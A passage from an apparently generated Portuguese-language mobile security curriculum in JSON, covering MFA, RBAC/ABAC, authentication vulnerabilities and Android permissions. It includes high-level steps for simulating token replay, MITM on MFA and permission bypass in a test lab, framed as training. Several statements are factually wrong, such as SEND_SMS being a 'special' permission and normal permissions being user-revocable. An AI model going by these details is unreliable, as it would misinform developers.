                              ],
                              "realWorldApplication": "Em apps bancários como Nubank ou Caixa, tokens via Google Authenticator ou YubiKey previnem fraudes; WebAuthn em Google/Microsoft elimina senhas, reduzindo phishing em 99% conforme estudos FIDO."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.3.2",
                            "name": "Implementar autenticação multifator (MFA)",
                            "description": "Configurar MFA em apps móveis combinando biometria/PIN com tokens, utilizando APIs como Android's Credential Manager ou iOS Keychain.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de desenvolvimento e dependências necessárias",
                                  "subSteps": [
                                    "Instale Android Studio ou Xcode com as versões mais recentes dos SDKs para mobile.",
                                    "Adicione dependências no build.gradle (Android): 'androidx.credentials:credentials:1.2.0' e 'androidx.credentials:credentials-play-services-auth:1.2.0'.",
                                    "Para iOS, importe Security.framework e configure Keychain Services no Xcode.",
                                    "Habilite permissões no AndroidManifest.xml: USE_BIOMETRIC e USE_FINGERPRINT.",
                                    "Configure emulador com suporte a biometria simulada."
                                  ],
                                  "verification": "Projeto compila sem erros e emulador inicia com biometria ativada.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Android Studio/Xcode",
                                    "Documentação oficial Credential Manager/Keychain",
                                    "Emulador com biometria"
                                  ],
                                  "tips": "Sempre verifique compatibilidade de API levels (Android 14+ para Credential Manager).",
                                  "learningObjective": "Preparar o ambiente para integração segura de MFA.",
                                  "commonMistakes": [
                                    "Ignorar permissões de biometria",
                                    "Usar versões desatualizadas de SDKs",
                                    "Não configurar emulador corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar autenticação biométrica ou PIN local",
                                  "subSteps": [
                                    "Crie uma classe AuthHelper com métodos para iniciar BiometricPrompt (Android) ou LAContext (iOS).",
                                    "Configure fallback para PIN usando CustomPINDialog.",
                                    "Armazene credenciais temporárias no Credential Manager/Keychain após sucesso.",
                                    "Implemente listener para callbacks de autenticação (success, error, fallback).",
                                    "Teste autenticação local isoladamente."
                                  ],
                                  "verification": "Autenticação biométrica/PIN funciona e armazena token temporário no Keychain.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Código de exemplo BiometricPrompt",
                                    "Documentação Apple LAContext",
                                    "Dispositivo/emulador físico"
                                  ],
                                  "tips": "Use cryptoObject para encriptar dados sensíveis durante autenticação.",
                                  "learningObjective": "Dominar autenticação local segura como base para MFA.",
                                  "commonMistakes": [
                                    "Não lidar com fallback para PIN",
                                    "Expor chaves privadas em logs",
                                    "Ignorar erros de hardware ausente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar geração e validação de tokens remotos",
                                  "subSteps": [
                                    "Implemente API client para solicitar token TOTP/HOTP do servidor backend.",
                                    "Após autenticação local, gere token usando biblioteca como 'otpauth'.",
                                    "Valide token no servidor via POST request com HMAC-SHA256.",
                                    "Armazene token validado no Credential Manager como CreatePublicKeyCredential.",
                                    "Configure rotação de tokens (expiração em 30s)."
                                  ],
                                  "verification": "Token é gerado, enviado e validado com sucesso no backend simulado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Biblioteca OTP Java/Swift",
                                    "Servidor mock com Flask/Node.js",
                                    "Postman para testes de API"
                                  ],
                                  "tips": "Use HTTPS sempre e valide certificados para evitar MITM.",
                                  "learningObjective": "Integrar tokens dinâmicos com autenticação local.",
                                  "commonMistakes": [
                                    "Reutilizar tokens expirados",
                                    "Não sincronizar relógio do dispositivo",
                                    "Expor tokens em memória desprotegida"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Combinar em fluxo MFA completo e gerenciar sessões",
                                  "subSteps": [
                                    "Crie fluxo sequencial: biometria/PIN → token → verificação servidor.",
                                    "Implemente recuperação de sessão usando stored credentials.",
                                    "Adicione rate limiting (máx 3 tentativas) e lockout temporário.",
                                    "Registre logs de autenticação (sem dados sensíveis).",
                                    "Integre com navegação do app (bloqueio até MFA sucesso)."
                                  ],
                                  "verification": "Fluxo MFA completo autentica usuário e libera acesso ao app.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Código boilerplate de MFA",
                                    "Ferramentas de logging como Timber/OSLog"
                                  ],
                                  "tips": "Teste em cenários offline (cache tokens seguros).",
                                  "learningObjective": "Construir MFA robusto e user-friendly.",
                                  "commonMistakes": [
                                    "Permitir bypass de MFA",
                                    "Logs vazarem PII",
                                    "Não implementar lockout"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar segurança, depurar e otimizar",
                                  "subSteps": [
                                    "Execute testes unitários para cada componente (JUnit/XCTest).",
                                    "Simule ataques: brute-force PIN, replay tokens, biometria spoofing.",
                                    "Meça performance (tempo <2s) e otimize com async tasks.",
                                    "Audite código com static analysis (SonarQube).",
                                    "Documente configuração para deploy."
                                  ],
                                  "verification": "Todos testes passam e relatório de segurança sem vulnerabilidades críticas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de teste: Espresso/XCUITest",
                                    "Frida para dynamic analysis",
                                    "Relatórios OWASP Mobile Top 10"
                                  ],
                                  "tips": "Use proxies como Burp Suite para inspecionar tráfego.",
                                  "learningObjective": "Garantir MFA resiliente a ameaças reais.",
                                  "commonMistakes": [
                                    "Pular testes de edge cases",
                                    "Ignorar performance em dispositivos low-end",
                                    "Não auditar dependências"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app bancário móvel, ao login: 1) Usuário escaneia impressão digital/PIN; 2) App gera TOTP token; 3) Servidor valida token + biometria; 4) Sessão liberada para transferências seguras.",
                              "finalVerifications": [
                                "MFA resiste a 5 tentativas falhas de PIN/token sem vazamento.",
                                "Tokens expiram corretamente e sessões são invalidadas.",
                                "Autenticação funciona offline com cache seguro por 5min.",
                                "Nenhum dado sensível logado ou exposto em rede.",
                                "Integração cross-platform (Android/iOS) sem discrepâncias.",
                                "Recuperação de conta via email/SMS como fallback configurado."
                              ],
                              "assessmentCriteria": [
                                "Fluxo MFA completo implementado com <5% taxa de falha em testes.",
                                "Uso correto de APIs nativas (Credential Manager/Keychain) sem depreciações.",
                                "Segurança: conformidade com OWASP Mobile Top 10 (M1-M9).",
                                "Usabilidade: tempo total de autenticação <3s em 90% casos.",
                                "Código limpo: cobertura de testes >80%, sem warnings de lint.",
                                "Documentação: README com passos de setup e troubleshooting."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de HMAC para tokens e AES para storage.",
                                "UX/UI Design: Interfaces intuitivas para biometria e erros.",
                                "Redes e APIs: Integração segura com backends REST/gRPC.",
                                "Privacidade de Dados: Conformidade GDPR com minimal data collection.",
                                "Desenvolvimento Ágil: Test-driven development para iterações rápidas."
                              ],
                              "realWorldApplication": "Implementado em apps como Google Authenticator, banking apps (Nubank/PF), ou enterprise VPNs para acesso remoto seguro, prevenindo 99% dos acessos não autorizados via credenciais roubadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.3.3",
                            "name": "Modelar controle de acesso em plataformas móveis",
                            "description": "Descrever modelos como RBAC (Role-Based Access Control) e ABAC (Attribute-Based) em Android (Permission Groups) e iOS (App Sandboxing), gerenciando acessos a câmera, localização e contatos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de RBAC e ABAC",
                                  "subSteps": [
                                    "Estude a definição de RBAC: controle de acesso baseado em papéis atribuídos a usuários.",
                                    "Analise ABAC: controle baseado em atributos de usuário, recurso, ação e ambiente.",
                                    "Compare RBAC e ABAC: identifique cenários onde cada um é mais adequado (ex: RBAC para hierarquias organizacionais, ABAC para contextos dinâmicos).",
                                    "Revise componentes chave: políticas, regras e enforcement points.",
                                    "Crie um diagrama simples comparando os dois modelos."
                                  ],
                                  "verification": "Crie um fluxograma explicando como RBAC e ABAC funcionam e responda a 5 perguntas de verificação sobre diferenças.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação NIST sobre RBAC e ABAC",
                                    "Vídeos tutoriais no YouTube sobre modelos de acesso",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use analogias reais, como chaves de portas (RBAC) vs biometria contextual (ABAC), para fixar conceitos.",
                                  "learningObjective": "Diferenciar e explicar RBAC e ABAC com exemplos claros.",
                                  "commonMistakes": [
                                    "Confundir atributos em ABAC com papéis fixos em RBAC",
                                    "Ignorar o contexto ambiental em ABAC",
                                    "Achar que RBAC é sempre mais simples que ABAC"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Controle de Acesso no Android com Permission Groups",
                                  "subSteps": [
                                    "Instale Android Studio e crie um projeto básico.",
                                    "Estude o manifesto Android: declare permissões como CAMERA, LOCATION e CONTACTS.",
                                    "Implemente runtime permissions: solicite e gerencie permissões em tempo de execução.",
                                    "Agrupe permissões em grupos (ex: Location permissions) e teste negações.",
                                    "Analise como Permission Groups se alinham com RBAC/ABAC."
                                  ],
                                  "verification": "Compile e execute um app que solicita e verifica 3 permissões, registrando logs de concessão/negação.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Documentação oficial developer.android.com sobre Permissions",
                                    "Emulador Android"
                                  ],
                                  "tips": "Sempre verifique a versão do Android, pois permissões mudaram do 6.0+.",
                                  "learningObjective": "Configurar e gerenciar permissões no Android de forma segura.",
                                  "commonMistakes": [
                                    "Esquecer runtime permissions em apps targeting API 23+",
                                    "Declarar permissões desnecessárias no manifesto",
                                    "Não tratar negações graciosamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar App Sandboxing e Controle de Acesso no iOS",
                                  "subSteps": [
                                    "Instale Xcode e crie um projeto iOS.",
                                    "Estude App Sandbox: entenda isolamento por padrão e entitlements.",
                                    "Configure acessos a câmera (AVFoundation), localização (CoreLocation) e contatos (Contacts framework).",
                                    "Implemente Info.plist com chaves de privacidade e gerencie prompts de autorização.",
                                    "Compare sandboxing iOS com permissions Android."
                                  ],
                                  "verification": "Execute o app no simulador iOS e capture screenshots de prompts de permissão para os 3 recursos.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Xcode",
                                    "Documentação Apple developer.apple.com sobre Privacy e Sandbox",
                                    "Simulador iOS"
                                  ],
                                  "tips": "Use entitlements apenas quando necessário para evitar rejeições na App Store.",
                                  "learningObjective": "Implementar controles de acesso nativos no iOS.",
                                  "commonMistakes": [
                                    "Ignorar chaves NSPrivacy no Info.plist",
                                    "Não lidar com cenários offline para localização",
                                    "Confundir sandbox com jailbreak"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Modelar e Integrar Controles de Acesso em um Cenário Híbrido",
                                  "subSteps": [
                                    "Desenhe um modelo unificado usando RBAC para Android e ABAC para iOS em um app cross-platform.",
                                    "Implemente um exemplo prático: app que acessa câmera só para 'admin' (RBAC) ou baseado em localização (ABAC).",
                                    "Teste violações de acesso e logging de auditoria.",
                                    "Documente políticas de acesso em pseudocódigo.",
                                    "Avalie trade-offs de performance e usabilidade."
                                  ],
                                  "verification": "Gere um relatório com diagramas, código-fonte e testes de 5 cenários de acesso.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Flutter ou React Native para cross-platform (opcional)",
                                    "Ferramentas de diagramação",
                                    "Documentos de políticas de segurança"
                                  ],
                                  "tips": "Comece com Android para protótipo rápido, depois porte para iOS.",
                                  "learningObjective": "Modelar controles de acesso adaptados a plataformas móveis.",
                                  "commonMistakes": [
                                    "Não considerar diferenças de API entre plataformas",
                                    "Sobrecarregar o modelo com atributos desnecessários",
                                    "Esquecer auditoria de acessos"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app de gerenciamento de estoque móvel onde administradores (RBAC no Android) acessam câmera para escanear itens, e usuários comuns acessam contatos apenas se localização indicar escritório (ABAC no iOS).",
                              "finalVerifications": [
                                "Explique RBAC vs ABAC com um diagrama.",
                                "Liste e demonstre 3 permissões Android com código.",
                                "Mostre configuração de sandbox iOS para câmera e localização.",
                                "Crie uma política híbrida para acessos a contatos.",
                                "Teste e registre 3 cenários de negação de acesso.",
                                "Compare eficácia em termos de segurança e usabilidade."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual de RBAC/ABAC (25%)",
                                "Correta implementação de permissões Android/iOS (30%)",
                                "Qualidade do modelo integrado e diagramas (20%)",
                                "Cobertura de verificações e auditoria (15%)",
                                "Tratamento de erros e usabilidade (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação Mobile (desenvolvimento de apps)",
                                "Privacidade de Dados (LGPD/GDPR compliance)",
                                "Redes e Sistemas Distribuídos (OAuth integration)",
                                "Engenharia de Software (design de políticas)"
                              ],
                              "realWorldApplication": "Em aplicativos bancários móveis como Nubank, onde RBAC controla acesso a transações por role de usuário e ABAC restringe localização de câmera para autenticação biométrica apenas em ambientes seguros."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.1.3.4",
                            "name": "Avaliar vulnerabilidades em autenticação móvel",
                            "description": "Identificar ataques como replay de tokens, man-in-the-middle em MFA e bypass de permissões, com mitigação via criptografia e verificação de integridade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Autenticação Móvel",
                                  "subSteps": [
                                    "Definir conceitos chave: tokens de autenticação, MFA (Multi-Factor Authentication) e permissões em apps móveis.",
                                    "Estudar protocolos comuns como OAuth 2.0, OpenID Connect e SAML adaptados para mobile.",
                                    "Explorar componentes: chaves API, sessões, biometria e controle de autorização baseado em roles.",
                                    "Revisar arquitetura típica de autenticação em dispositivos móveis (client-server).",
                                    "Analisar diferenças entre autenticação web e móvel, focando em constraints de rede e storage."
                                  ],
                                  "verification": "Escrever um resumo de 200 palavras explicando os componentes em suas próprias palavras e diagrama de fluxo.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação OWASP Mobile Security Top 10",
                                    "Guia OAuth 2.0 for Mobile & Desktop Apps",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use analogias reais, como comparar tokens a chaves de hotel, para fixar conceitos.",
                                  "learningObjective": "Dominar os componentes fundamentais de autenticação móvel para identificar pontos de falha.",
                                  "commonMistakes": [
                                    "Confundir autenticação (quem é você?) com autorização (o que você pode fazer?).",
                                    "Ignorar constraints móveis como bateria e conectividade intermitente."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Vulnerabilidades Comuns em Autenticação Móvel",
                                  "subSteps": [
                                    "Listar vulnerabilidades OWASP Mobile: replay de tokens, MITM em MFA e bypass de permissões.",
                                    "Mapear riscos: storage inseguro de tokens, transmissão sem criptografia e validação fraca.",
                                    "Estudar vetores de ataque: sniffing de rede, engenharia social e side-channel attacks.",
                                    "Classificar impactos: roubo de sessão, escalada de privilégios e perda de dados.",
                                    "Revisar relatórios de incidentes reais como casos de apps bancários comprometidos."
                                  ],
                                  "verification": "Criar uma tabela comparativa de 3 vulnerabilidades com descrição, impacto e CVSS score estimado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "OWASP Mobile Security Testing Guide (MSTG)",
                                    "Relatórios CVE relacionados a autenticação móvel",
                                    "Ferramenta Google Sheets ou Excel para tabelas"
                                  ],
                                  "tips": "Priorize vulnerabilidades de alta prevalência em apps reais usando filtros CVE por keyword 'mobile auth'.",
                                  "learningObjective": "Reconhecer padrões de vulnerabilidades específicas em autenticação móvel.",
                                  "commonMistakes": [
                                    "Superestimar segurança de HTTPS sem HSTS ou pinning de certificado.",
                                    "Ignorar ataques offline como extração de tokens de storage."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Ataques Específicos: Replay, MITM e Bypass",
                                  "subSteps": [
                                    "Simular replay de tokens: capturar e reutilizar token sem expiração ou nonce.",
                                    "Executar MITM em MFA: interceptar OTP via proxy e falsificar respostas.",
                                    "Testar bypass de permissões: explorar falhas em RBAC ou validação client-side.",
                                    "Usar ferramentas para demonstrar: Burp Suite para interceptação, Frida para injeção.",
                                    "Documentar fluxos de ataque com screenshots e logs."
                                  ],
                                  "verification": "Gravar um vídeo curto (2-3 min) demonstrando um ataque e explicando passos.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Burp Suite Community Edition",
                                    "Frida framework para mobile hooking",
                                    "Emulador Android/iOS com app de teste vulnerável (ex: Damn Vulnerable iOS App)"
                                  ],
                                  "tips": "Configure proxy no emulador primeiro e teste em ambiente isolado para evitar falsos positivos.",
                                  "learningObjective": "Executar e analisar ataques práticos para entender mecânicas de exploração.",
                                  "commonMistakes": [
                                    "Não invalidar tráfego criptografado adequadamente com root CA personalizado.",
                                    "Confundir simulação com ataque real, expondo dados sensíveis."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Mitigações e Verificação de Integridade",
                                  "subSteps": [
                                    "Aplicar criptografia: usar TLS 1.3, certificate pinning e criptografia de token (JWE).",
                                    "Mitigar replay: implementar nonce, timestamps e token binding.",
                                    "Fortalecer MFA: push notifications com verificação de dispositivo e TOTP com rate limiting.",
                                    "Prevenir bypass: validação server-side estrita e least privilege principle.",
                                    "Testar mitigações com ferramentas de pentest e auditoria automatizada."
                                  ],
                                  "verification": "Executar testes de regressão nos ataques originais e confirmar falha de exploração.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Bibliotecas: OkHttp para pinning, JWT.io para tokens",
                                    "MobSF (Mobile Security Framework) para análise estática/dinâmica",
                                    "App de teste modificado do Step 3"
                                  ],
                                  "tips": "Comece com mitigações mínimas e itere, medindo redução de risco com scores qualitativos.",
                                  "learningObjective": "Desenvolver defesas robustas contra vulnerabilidades identificadas.",
                                  "commonMistakes": [
                                    "Implementar pinning incorreto, permitindo downgrade attacks.",
                                    "Esquecer rotação de chaves ou auditoria de logs."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Avaliar e Documentar a Segurança Geral",
                                  "subSteps": [
                                    "Realizar threat modeling completo usando STRIDE para autenticação móvel.",
                                    "Compilar relatório: vulnerabilidades, ataques, mitigações e resíduos de risco.",
                                    "Testar cenários edge: perda de dispositivo, rede não confiável.",
                                    "Recomendar práticas contínuas: monitoramento, atualizações e DAST/SAST.",
                                    "Peer review: compartilhar relatório para feedback."
                                  ],
                                  "verification": "Produzir relatório final de 5-10 páginas com evidências e recomendações.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Template de Threat Modeling (Microsoft STRIDE)",
                                    "Ferramentas como OWASP ZAP para scanning",
                                    "Google Docs para relatório"
                                  ],
                                  "tips": "Use matriz de risco (probabilidade x impacto) para priorizar.",
                                  "learningObjective": "Integrar avaliação holística para maturidade em segurança móvel.",
                                  "commonMistakes": [
                                    "Focar só em mitigações técnicas, ignorando humanas (treinamento).",
                                    "Não considerar conformidade (GDPR, PCI-DSS)."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app Android de login com token JWT. Introduza vulnerabilidade de replay capturando token via Burp Suite e reutilizando-o. Demonstre MITM falsificando MFA SMS. Mitigue adicionando nonce único por request, timestamp com tolerância de 5min e certificate pinning. Teste em emulador com rede proxyada, confirmando que ataques falham pós-mitigação.",
                              "finalVerifications": [
                                "Listar e explicar 3 ataques principais com vetores exatos.",
                                "Demonstrar simulação prática de pelo menos 2 ataques em vídeo.",
                                "Implementar e testar mitigações efetivas contra todos ataques identificados.",
                                "Produzir threat model STRIDE para autenticação móvel.",
                                "Gerar relatório com evidências de testes e recomendações.",
                                "Identificar 2 conexões com regulamentações como PCI-DSS."
                              ],
                              "assessmentCriteria": [
                                "Precisão e profundidade na identificação de vulnerabilidades (30%).",
                                "Qualidade e eficácia das simulações de ataques (25%).",
                                "Robustez das mitigações implementadas e verificadas (25%).",
                                "Clareza e completude do relatório final (10%).",
                                "Criatividade em conexões interdisciplinares e aplicações reais (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de protocolos TLS e interceptação de tráfego.",
                                "Criptografia: Uso de algoritmos assimétricos e hashing para integridade.",
                                "Desenvolvimento de Software: Integração segura em apps mobile (Android/iOS).",
                                "Ética e Direito: Implicações de privacidade em dados biométricos e conformidade.",
                                "Análise de Dados: Logs e monitoramento para detecção de anomalias."
                              ],
                              "realWorldApplication": "Em aplicativos bancários móveis como Nubank ou PicPay, onde avaliação de vulnerabilidades previne fraudes milionárias por replay de tokens ou MITM em MFA, garantindo confiança do usuário e conformidade regulatória."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.2",
                    "name": "Gerenciamento de Permissões de Aplicativos",
                    "description": "Controle granular de permissões para apps em sistemas como Android e iOS, incluindo sandboxing.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.2.1",
                        "name": "Permissões Granulares no Android",
                        "description": "Sistema de permissões do Android que permite controle detalhado sobre acesso a recursos do dispositivo, como câmera, localização e contatos, com distinção entre permissões normais e perigosas solicitadas em tempo de execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.2.1.1",
                            "name": "Identificar tipos de permissões no Android",
                            "description": "Diferenciar permissões normais (concedidas automaticamente), perigosas (solicitadas em runtime) e especiais (como SMS), consultando o AndroidManifest.xml e documentação oficial.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar a documentação oficial do Android sobre tipos de permissões",
                                  "subSteps": [
                                    "Acesse o site oficial do Android Developer em developer.android.com.",
                                    "Navegue para a seção 'Permissions' no guia de desenvolvimento.",
                                    "Leia as definições de permissões normais (auto-concedidas), perigosas (runtime) e especiais (ex.: SMS).",
                                    "Anote as características principais de cada tipo.",
                                    "Compare tabelas de exemplos de permissões por categoria."
                                  ],
                                  "verification": "Resuma em 3 frases as diferenças entre os tipos de permissões.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Android Developer Documentation (developer.android.com/guide/topics/permissions/overview)"
                                  ],
                                  "tips": "Use Ctrl+F para buscar 'normal', 'dangerous' e 'special' permissions.",
                                  "learningObjective": "Compreender as definições oficiais e categorias de permissões no Android.",
                                  "commonMistakes": [
                                    "Ignorar a distinção entre 'install-time' e 'runtime' grants",
                                    "Confundir permissões especiais com normais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar permissões normais das perigosas",
                                  "subSteps": [
                                    "Liste 5 exemplos de permissões normais (ex.: INTERNET, ACCESS_NETWORK_STATE).",
                                    "Explique por que são concedidas automaticamente na instalação.",
                                    "Liste 5 exemplos de permissões perigosas (ex.: CAMERA, LOCATION).",
                                    "Descreva o processo de solicitação em runtime para perigosas.",
                                    "Crie uma tabela comparativa com colunas: Tipo, Exemplos, Momento de Concessão."
                                  ],
                                  "verification": "Classifique corretamente 10 permissões mistas em um quiz autoavaliado.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto ou planilha (Google Sheets)",
                                    "Lista de permissões comuns do Android"
                                  ],
                                  "tips": "Lembre-se: normais não acessam dados privados do usuário.",
                                  "learningObjective": "Distinguir com precisão permissões normais de perigosas baseadas em impacto de privacidade.",
                                  "commonMistakes": [
                                    "Achar que todas as permissões de rede são perigosas",
                                    "Esquecer que normais podem ser revogadas pelo usuário em configurações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar permissões especiais e seu gerenciamento",
                                  "subSteps": [
                                    "Identifique permissões especiais (ex.: SEND_SMS, READ_CALENDAR).",
                                    "Leia sobre como solicitá-las via Special app access no Settings.",
                                    "Compare com perigosas: especiais requerem aprovação manual do usuário.",
                                    "Liste cenários onde especiais são usadas (ex.: apps de automação).",
                                    "Anote restrições pós-Android 6.0 (Marshmallow)."
                                  ],
                                  "verification": "Explique em um parágrafo como solicitar uma permissão especial.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Android Developer Docs - Special Permissions",
                                    "Emulador Android para verificação prática"
                                  ],
                                  "tips": "Permissões especiais são um subconjunto restrito; memorize as principais.",
                                  "learningObjective": "Reconhecer e gerenciar permissões especiais que demandam configurações manuais.",
                                  "commonMistakes": [
                                    "Confundir especiais com signature permissions",
                                    "Subestimar necessidade de redirecionar usuário para Settings"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Consultar e analisar AndroidManifest.xml para identificar tipos",
                                  "subSteps": [
                                    "Baixe um exemplo de projeto Android ou APK descompilado.",
                                    "Abra o AndroidManifest.xml em um editor de texto.",
                                    "Localize tags <uses-permission android:name=\"...\" />.",
                                    "Use documentação para classificar cada permissão listada.",
                                    "Gere um relatório resumindo tipos encontrados no manifest."
                                  ],
                                  "verification": "Analise um manifest real e liste corretamente tipos de 8+ permissões.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Android Studio ou APKTool para decompilação",
                                    "Exemplo de AndroidManifest.xml de app open-source (GitHub)",
                                    "Referência de permissões: developer.android.com/reference/android/Manifest.permission"
                                  ],
                                  "tips": "Ferramentas como AXMLPrinter ajudam a visualizar manifests de APKs.",
                                  "learningObjective": "Aplicar conhecimento para inspecionar manifests e categorizar permissões.",
                                  "commonMistakes": [
                                    "Não diferenciar protectionLevel nos manifests",
                                    "Ignorar permissões implícitas não listadas explicitamente"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar identificação integrada em um app exemplo",
                                  "subSteps": [
                                    "Crie um app simples declarando permissões mistas no manifest.",
                                    "Compile e instale no emulador.",
                                    "Observe grants na instalação e runtime.",
                                    "Teste revogação e re-solicitação.",
                                    "Documente observações por tipo de permissão."
                                  ],
                                  "verification": "Demonstre em vídeo ou logcat o comportamento de cada tipo.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Android Studio",
                                    "Emulador ou dispositivo físico"
                                  ],
                                  "tips": "Use Logcat para monitorar permission checks.",
                                  "learningObjective": "Integrar teoria com prática na identificação e teste de permissões.",
                                  "commonMistakes": [
                                    "Declarar permissões desnecessárias",
                                    "Não testar em diferentes versões do Android"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de rede social, identifique INTERNET (normal, auto-concedida), CONTACTS (perigosa, runtime) e SYSTEM_ALERT_WINDOW (especial, via Settings), analisando o AndroidManifest.xml e testando runtime requests para evitar vazamento de dados.",
                              "finalVerifications": [
                                "Classificar corretamente 10 permissões aleatórias de uma lista oficial.",
                                "Analisar um AndroidManifest.xml real e categorizar todas as permissões.",
                                "Explicar diferenças em uma apresentação de 2 minutos.",
                                "Identificar uma permissão especial em um app instalado no dispositivo.",
                                "Listar riscos de conceder permissões perigosas desnecessárias."
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação (100% para mastery).",
                                "Capacidade de consultar docs e manifest corretamente.",
                                "Explicação clara de runtime vs install-time grants.",
                                "Identificação de pelo menos 3 exemplos por categoria.",
                                "Análise de riscos associados a cada tipo."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software (Android Studio e manifests).",
                                "Privacidade e Ética em TI (gerenciamento de dados sensíveis).",
                                "Segurança de Sistemas (auditoria de apps móveis).",
                                "Programação Orientada a Objetos (contextos de permissões em código).",
                                "Análise de Dados (classificação e categorização)."
                              ],
                              "realWorldApplication": "Auditores de segurança usam isso para revisar APKs em pentests, identificando apps com permissões excessivas como CAMERA sem necessidade, prevenindo espionagem ou roubo de dados em ambientes corporativos ou pessoais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.1.2",
                            "name": "Gerenciar permissões em tempo de execução",
                            "description": "Explicar e demonstrar como usuários concedem ou revogam permissões dinamicamente via configurações do app ou sistema, usando APIs como requestPermissions() e shouldShowRequestPermissionRationale().",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Configurar Permissões no AndroidManifest",
                                  "subSteps": [
                                    "Estude o conceito de permissões em tempo de execução introduzido no Android 6.0 (API 23).",
                                    "Abra o AndroidManifest.xml e declare permissões necessárias, como CAMERA ou LOCATION.",
                                    "Classifique permissões como 'normal' ou 'dangerous' usando a documentação oficial do Android.",
                                    "Configure o targetSdkVersion para 23 ou superior no build.gradle.",
                                    "Revise exemplos de permissões granulares na developer.android.com."
                                  ],
                                  "verification": "Verifique se o AndroidManifest.xml lista as permissões corretamente sem erros de compilação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Android Studio, documentação Android Developer (Permissions overview), emulador Android 6.0+",
                                  "tips": "Sempre declare apenas permissões essenciais para evitar rejeições na Play Store.",
                                  "learningObjective": "Compreender a declaração estática de permissões e sua distinção por tipo de risco.",
                                  "commonMistakes": "Esquecer de definir targetSdkVersion >=23, causando falhas em runtime."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar Status de Permissões com APIs",
                                  "subSteps": [
                                    "Implemente ContextCompat.checkSelfPermission() para verificar permissões atuais.",
                                    "Use shouldShowRequestPermissionRationale() para determinar se explicar o motivo da permissão.",
                                    "Crie uma função utilitária para checar múltiplas permissões de uma vez.",
                                    "Integre a verificação em um botão ou evento de UI, como 'Iniciar Câmera'.",
                                    "Teste em emulador com permissões negadas previamente."
                                  ],
